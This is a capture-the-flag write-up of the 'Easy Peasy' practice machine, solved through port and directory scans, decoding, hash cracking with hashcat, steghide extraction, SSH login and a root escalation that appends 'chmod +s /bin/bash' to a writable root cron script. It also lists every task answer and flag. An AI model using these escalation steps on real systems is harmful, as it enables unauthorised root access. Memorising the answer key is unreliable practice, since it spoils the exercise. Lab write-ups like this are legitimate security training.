**Today we have a pretty easy machine called "Easy Peasy":**
"Practice using tools such as Nmap and GoBuster to locate a hidden directory to get initial access to a vulnerable machine. Then escalate your privileges through a vulnerable cronjob."

Since the machine is ABSURDLY simple, I'm going to explain everything in great detail so that even the most basic concepts are clear.

Let's begin with basic enumeration, firstly we'll use a simple `nmap` to enumerate all the info about the machine itself: 
```
❯ nmap -sV -p- -O --min-rate 5000 10.129.175.6 -v
Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-18 22:45 CEST
NSE: Loaded 47 scripts for scanning.
Initiating Ping Scan at 22:45
Scanning 10.129.175.6 [4 ports]
Completed Ping Scan at 22:45, 0.07s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 22:45
Completed Parallel DNS resolution of 1 host. at 22:45, 0.01s elapsed
Initiating SYN Stealth Scan at 22:45
Scanning 10.129.175.6 [65535 ports]
Discovered open port 80/tcp on 10.129.175.6
Discovered open port 6498/tcp on 10.129.175.6
Discovered open port 65524/tcp on 10.129.175.6
Completed SYN Stealth Scan at 22:45, 10.95s elapsed (65535 total ports)
Initiating Service scan at 22:45
Scanning 3 services on 10.129.175.6
Completed Service scan at 22:45, 11.13s elapsed (3 services on 1 host)
Initiating OS detection (try #1) against 10.129.175.6
Retrying OS detection (try #2) against 10.129.175.6
Retrying OS detection (try #3) against 10.129.175.6
Retrying OS detection (try #4) against 10.129.175.6
Retrying OS detection (try #5) against 10.129.175.6
NSE: Script scanning 10.129.175.6.
Initiating NSE at 22:46
Completed NSE at 22:46, 0.19s elapsed
Initiating NSE at 22:46
Completed NSE at 22:46, 0.15s elapsed
Nmap scan report for 10.129.175.6
Host is up (0.035s latency).
Not shown: 65532 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
80/tcp    open  http    nginx 1.16.1
6498/tcp  open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
65524/tcp open  http    Apache httpd 2.4.43 ((Ubuntu))
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=4/18%OT=80%CT=1%CU=43049%PV=Y%DS=3%DC=I%G=Y%TM=69E3ED8
OS:D%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=106%TI=Z%CI=Z%II=I%TS=A)SEQ
OS:(SP=106%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=106%GCD=1%ISR=10D%TI=Z%
OS:CI=Z%II=I%TS=A)SEQ(SP=108%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=108%G
OS:CD=1%ISR=10E%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M4E8ST11NW6%O2=M4E8ST11NW6%O3=M4
OS:E8NNT11NW6%O4=M4E8ST11NW6%O5=M4E8ST11NW6%O6=M4E8ST11)WIN(W1=F4B3%W2=F4B3
OS:%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M4E8NNSNW6%C
OS:C=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%
OS:T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD
OS:=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S
OS:=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK
OS:=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 22.020 days (since Fri Mar 27 21:17:31 2026)
Network Distance: 3 hops
TCP Sequence Prediction: Difficulty=262 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 34.10 seconds
           Raw packets sent: 65649 (2.893MB) | Rcvd: 65606 (2.628MB)
```

Firstly, i'll explain the whole command:
- `-sV` Is the parameter that detects the service and version running on each port.
- `-p-` Tells nmap that he have to scan all the ports, not just the first and common ones.
- `-O` Tries to detect the OS running in the scanned machine.
- `--min-rate` Defines the minimum number of packets per second that the tool must send, in this case, 5000 packets per second. (Obviously, don't even think about using this at work—for heaven's sake, you'll cause a huge mess.)
- `-v` This adds verbosity, in simple terms, it asks the program to explain in detail, step by step, what is happening.

That scan allows us to answer the first three questions:

**How many ports are open?**
Answer: `3`

**What is the version of nginx?**
Answer: `1.16.1`

**What is running on the highest port?**
Answer: `Apache`

Now let's list directories with Gobuster:
```
❯ gobuster dir -u http://10.129.175.6/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 50
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.175.6/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/hidden               (Status: 301) [Size: 169] [--> http://10.129.175.6/hidden/]
Progress: 87662 / 87662 (100.00%)
===============================================================
Finished
===============================================================
```

Here, let's explain the parameters:
- `dir` Tells the tool to list directories.
- `-u` With this parameter you set the objective URL.
- `-w` Here su set the wordlist, in this case i used `directory-list-2.3-small.txt` 
- `-t 50` I used this option because we have no traffic cap, i setted 50 threads at the same time.


The webpage is empty, there's only an image and the source code doesn't reveals anything interesting:
```
<!DOCTYPE html>
<html>
<head>
<title>Welcome to ctf!</title>
<style>
    body {
	background-image: url("https://cdn.pixabay.com/photo/2016/12/24/11/48/lost-places-1928727_960_720.jpg");
	background-repeat: no-repeat;
	background-size: cover;
        width: 35em;
        margin: 0 auto;
        font-family: Tahoma, Verdana, Arial, sans-serif;
    }
</style>
</head>
<body>
</body>
</html>
```

Let's dig deeper and perform another directory listing:
```
❯ gobuster dir -u http://10.129.175.6/hidden/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 50
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.175.6/hidden/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/whatever             (Status: 301) [Size: 169] [--> http://10.129.175.6/hidden/whatever/]
Progress: 87662 / 87662 (100.00%)
===============================================================
Finished
===============================================================
```

Here we can see a "dead end":
![[Pasted image 20260418231429.png]]

But let's check the source code:
```
<!DOCTYPE html>
<html>
<head>
<title>dead end</title>
<style>
    body {
	background-image: url("https://cdn.pixabay.com/photo/2015/05/18/23/53/norway-772991_960_720.jpg");
	background-repeat: no-repeat;
	background-size: cover;
        width: 35em;
        margin: 0 auto;
        font-family: Tahoma, Verdana, Arial, sans-serif;
    }
</style>
</head>
<body>
<center>
<p hidden>ZmxhZ3tmMXJzN19mbDRnfQ==</p>
</center>
</body>
</html>
```

Interesting! `<p hidden>ZmxhZ3tmMXJzN19mbDRnfQ==</p>` seems to be a base64 code, let's decode it.
```
❯ echo 'ZmxhZ3tmMXJzN19mbDRnfQ==' | base64 -d
flag{f1rs7_fl4g}% 
```

There we go, we just answered the first question:

**Using GoBuster, find flag 1.**
Answer: flag{f1rs7_fl4g}

Now let's check the apache port `http://10.129.175.6:65524/`
![[Pasted image 20260418232457.png]]

We have the default apache landing, but if we check closely the source code of this page we can find a couple of interesting things:
```
  <body>
    <div class="main_page">
      <div class="page_header floating_element">
        <img src="/icons/openlogo-75.png" alt="Debian Logo" class="floating_element"/>
        <span class="floating_element">
          Apache 2 It Works For Me
	<p hidden>its encoded with ba....:ObsJmP173N2X6dOrAgEAL0Vu</p>
        </span>
      </div>
<!--      <div class="table_of_contents floating_element">
        <div class="section_header section_header_grey">
          TABLE OF CONTENTS
        </div>
        <div class="table_of_contents_item floating_element">
          <a href="#about">About</a>
        </div>
        <div class="table_of_contents_item floating_element">
          <a href="#flag">hi</a>
        </div>
        <div class="table_of_contents_item floating_element">
          <a href="#scope">Scope</a>
        </div>
        <div class="table_of_contents_item floating_element">
          <a href="#files">Config files</a>
        </div>
      </div>
-->
```

We can find an interesting line in line `194`
```
<p hidden>its encoded with ba....:ObsJmP173N2X6dOrAgEAL0Vu</p>
```

It's not base64 at first sight but if we decode it...
```
❯ echo 'ObsJmP173N2X6dOrAgEAL0Vu' | base64 -d
9�	��{�ݗ�ӫ/En%    
```

We have a bunch of weird characters, so probablly it's not base64 let's try base62 encoding in CyberChef.io

Now, if we decode it:
![[Pasted image 20260418233314.png]]

Here we can see a subdirectory: `/n0th1ng3ls3m4tt3r`

In line 292 we can also find another flag:
```
They are activated by symlinking available
                           configuration files from their respective
                           Fl4g 3 : flag{9fdafbd64c47471a8f54cd3fc64cd312}
			   *-available/ counterparts. These should be managed
                           by using our helpers
```

And with that we can answer the next two questions:

**Crack the hash with easypeasy.txt, What is the flag 3?**
Answer: `flag{9fdafbd64c47471a8f54cd3fc64cd312}`

**What is the hidden directory?**
Answer: `/n0th1ng3ls3m4tt3r`


Now we have the new directory: `http://10.129.175.6:65524/n0th1ng3ls3m4tt3r/`
Let's check the source code:
```
<html>
<head>
<title>random title</title>
<style>
	body {
	background-image: url("https://cdn.pixabay.com/photo/2018/01/26/21/20/matrix-3109795_960_720.jpg");
	background-color:black;


	}
</style>
</head>
<body>
<center>
<img src="binarycodepixabay.jpg" width="140px" height="140px"/>
<p>940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81</p>
</center>
</body>
</html>
```

We can find a hash in line `16`, let's crack it.
```
<p>940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81</p>
```

First of all, let's identify the hash type with hashcat:
```
❯ hashid -m 940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81
Analyzing '940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81'
[+] Snefru-256 
[+] SHA-256 [Hashcat Mode: 1400]
[+] RIPEMD-256 
[+] Haval-256 
[+] GOST R 34.11-94 [Hashcat Mode: 6900]
[+] GOST CryptoPro S-Box 
[+] SHA3-256 [Hashcat Mode: 5000]
[+] Skein-256 
[+] Skein-512(256) 
```

To avoid writing out a lot of commands, I won’t list all the tests I ran, since there were so many different hash types that I had to test several times to confirm the specific hash type. 
At first glance, I thought it would be SHA-256 since it had 64 characters; however, hashcat failed. Therefore, even though I had the EXACT wordlist, I ruled out that format and kept testing until I found that the hash format was GOST:
```
❯ hashcat -m 6900 hash.txt easypeasy.txt
hashcat (v7.1.2) starting

/usr/share/hashcat/OpenCL/m06900_a0-optimized.cl: Pure kernel not found, falling back to optimized kernel
OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-haswell-AMD Ryzen 7 5800X 8-Core Processor, 2930/5861 MB (1024 MB allocatable), 8MCU

/usr/share/hashcat/OpenCL/m06900_a0-optimized.cl: Pure kernel not found, falling back to optimized kernel
Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 32

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Optimized-Kernel
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 514 MB (5277 MB free)

Dictionary cache hit:
* Filename..: easypeasy.txt
* Passwords.: 5141
* Bytes.....: 48856
* Keyspace..: 5141

The wordlist or mask that you are using is too small.
This means that hashcat cannot use the full parallel power of your device(s).
Hashcat is expecting at least 8192 base words but only got 62.8% of that.
Unless you supply more work, your cracking speed will drop.
For tips on supplying more work, see: https://hashcat.net/faq/morework

Approaching final keyspace - workload adjusted.           

940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81:mypasswordforthatjob
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 6900 (GOST R 34.11-94)
Hash.Target......: 940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d14...e6fd81
Time.Started.....: Sat Apr 18 23:50:50 2026 (0 secs)
Time.Estimated...: Sat Apr 18 23:50:50 2026 (0 secs)
Kernel.Feature...: Optimized Kernel (password length 0-32 bytes)
Guess.Base.......: File (easypeasy.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:  1182.5 kH/s (2.93ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 5141/5141 (100.00%)
Rejected.........: 1/5141 (0.02%)
Restore.Point....: 0/5141 (0.00%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: 123456 -> sunshine
Hardware.Mon.#01.: Util: 13%

Started: Sat Apr 18 23:49:29 2026
Stopped: Sat Apr 18 23:50:51 2026
```

```
❯ hashcat -m 6900 940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81 easypeasy.txt --show
940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81:mypasswordforthatjob
```

With that done, we can answer the next question: 

**Using the wordlist that provided to you in this task crack the hash**  
**what is the password?**
Answer: `mypasswordforthatjob`

Nothing else? let's check the image of `http://10.129.175.6:65524/n0th1ng3ls3m4tt3r/` just in case with steghide, and we'll use the password for passphrase.
```
❯ steghide extract -sf binarycodepixabay.jpg
Enter passphrase: 
wrote extracted data to "secrettext.txt".
```

Let's check what steghide extracted:
```
❯ cat secrettext.txt | less
username:boring
password:
01101001 01100011 01101111 01101110 01110110 01100101 01110010 01110100 01100101 01100100 01101101 01111001 01110000 01100001 01110011 01110011 01110111 01101111 01110010 01100100 01110100 01101111 01100010 01101001 01101110 01100001 01110010 01111001
```

Now we go to CyberChef.io again and check the binary:
![[Pasted image 20260419003605.png]]

And with that we have all we need:
Username: boring
Password: iconvertedmypasswordtobinary

Also, we have the answer for the next question:

**What is the password to login to the machine via SSH?**
Answer: `iconvertedmypasswordtobinary`

Now let's login to the SSH:
```
❯ ssh -p 6498 boring@10.129.175.6
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
*************************************************************************
**        This connection are monitored by government offical          **
**            Please disconnect if you are not authorized	      **
** A lawsuit will be filed against you if the law is not followed      **
*************************************************************************
boring@10.129.175.6's password: 
You Have 1 Minute Before AC-130 Starts Firing
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
!!!!!!!!!!!!!!!!!!I WARN YOU !!!!!!!!!!!!!!!!!!!!
You Have 1 Minute Before AC-130 Starts Firing
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
!!!!!!!!!!!!!!!!!!I WARN YOU !!!!!!!!!!!!!!!!!!!!
boring@kral4-PC:~$ 
```

Now we have the flag but wait, it's rotated!
```
boring@kral4-PC:~$ ls
user.txt
boring@kral4-PC:~$ cat user.txt
User Flag But It Seems Wrong Like It`s Rotated Or Something
synt{a0jvgf33zfa0ez4y}
boring@kral4-PC:~$ 
```

Let's use ROT13 on CyberChef.io:
![[Pasted image 20260419004031.png]]

And we have the user flag!! 

**What is the user flag?**
Answer:`flag{n0wits33msn0rm4l}`

Now let's enumerate the machine:
```
boring@kral4-PC:~$ cat user.txt
User Flag But It Seems Wrong Like It`s Rotated Or Something
synt{a0jvgf33zfa0ez4y}
boring@kral4-PC:~$ find / -perm -4000 -type f 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/sbin/pppd
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/traceroute6.iputils
/bin/ping
/bin/mount
/bin/fusermount
/bin/su
/bin/umount
```

See that we have `pkexec`, that linpeas or even AI might mistake it for a vulnerability, but speaking from experience i will ignore it for now.

Now let's check the crontabs:
```
boring@kral4-PC:~$ crontab -l
no crontab for boring
boring@kral4-PC:~$ 
```

Let's try with /etc/crontab:
```
boring@kral4-PC:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* *    * * *   root    cd /var/www/ && sudo bash .mysecretcronjob.sh
```

We can see that `* *    * * *   root    cd /var/www/ && sudo bash .mysecretcronjob.sh` executes every minute with `root` permissions, it's located in `/var/www/` from the file `.mysecretcronjob.sh`

This really smells like privilege escalation.

Let's check the permissions of that file.
```
boring@kral4-PC:~$ ls -la /var/www/.mysecretcronjob.sh
-rwxr-xr-x 1 boring boring 33 Jun 14  2020 /var/www/.mysecretcronjob.sh
boring@kral4-PC:~$ 
```

This means that we, as the `boring` user, have full control over a file that `crontab` will execute as `root` in less than a minute. This vulnerability is called **Privilege Escalation via CronJob Abuse.**

So let's modify the file to get a root shell in less than a minute:
```
boring@kral4-PC:~$ echo "chmod +s /bin/bash" >> /var/www/.mysecretcronjob.sh
```

And now let's wait, and after a while, we can do ls -la /bin/bash to check if it worked:
```
boring@kral4-PC:~$ ls -la /bin/bash
-rwxr-xr-x 1 root root 1113504 Jun  6  2019 /bin/bash
boring@kral4-PC:~$ ls -la /bin/bash
-rwsr-sr-x 1 root root 1113504 Jun  6  2019 /bin/bash
```

Depending on the terminal you can see that the `/bin/bash` has changed. Anyways, wait 1-2 minutes and run `/bin/bash -p`
```
boring@kral4-PC:~$ /bin/bash -p
bash-4.4# whoami
root
```

Let's go, here we are!
Now let's retrieve the root flag.
```
bash-4.4# cd /root
bash-4.4# ls -al
total 40
drwx------  5 root root 4096 Jun 15  2020 .
drwxr-xr-x 23 root root 4096 Jun 15  2020 ..
-rw-------  1 root root  883 Jun 15  2020 .bash_history
-rw-r--r--  1 root root 3136 Jun 15  2020 .bashrc
drwx------  2 root root 4096 Jun 13  2020 .cache
drwx------  3 root root 4096 Jun 13  2020 .gnupg
drwxr-xr-x  3 root root 4096 Jun 13  2020 .local
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   39 Jun 15  2020 .root.txt
-rw-r--r--  1 root root   66 Jun 14  2020 .selected_editor
bash-4.4# cat .root.txt
flag{63a9f0ea7bb98050796b649e85481845}
```

**What is the root flag?**
Answer: `flag{63a9f0ea7bb98050796b649e85481845}`

Well, that's it! We've finished EasyPeasy. I hope you enjoyed it because, I have to say, even though it was simple, it was actually pretty fun!
See you in the next writeup!